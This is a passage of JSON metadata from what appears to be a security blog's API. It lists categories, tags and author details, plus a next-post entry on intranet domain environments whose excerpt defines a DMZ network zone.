mins."},"categories":[{"name":"内网渗透","slug":"内网渗透","count":7,"path":"api/categories/内网渗透.json"}],"tags":[{"name":"内网渗透","slug":"内网渗透","count":7,"path":"api/tags/内网渗透.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"内网安全-域环境与工作组及局域网探针","uid":"71056ae21dd2a465161404f46f6a02f9","slug":"内网安全-域环境与工作组及局域网探针","date":"2022-06-26T02:00:33.000Z","updated":"2022-06-26T14:34:56.974Z","comments":true,"path":"api/articles/内网安全-域环境与工作组及局域网探针.json","keywords":null,"cover":[],"text":"0x00脑图： 0x01 基本知识###0x00 网络拓扑 0x01 DMZ（非军事）区域DMZ，是英文“demilitarized zone”的缩写，中文名称为“隔离区”，也称“非军事化区”。它是为了解决安装防火墙后外部网络的访问用户不能访问内部网络服务器的问题，而设立的一个非...","link":"","photos":[],"count_time":{"symbolsCount":"5.5k","symbolsTime":"5 mins."},"categories":[{"name":"内网渗透","slug":"内网渗透","count":7,"path":"api/categories/内网渗透.json"}],"tags":[{"name":"内网渗透","slug":"内网渗透","count":7,"path":"api/tags/内网渗透.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}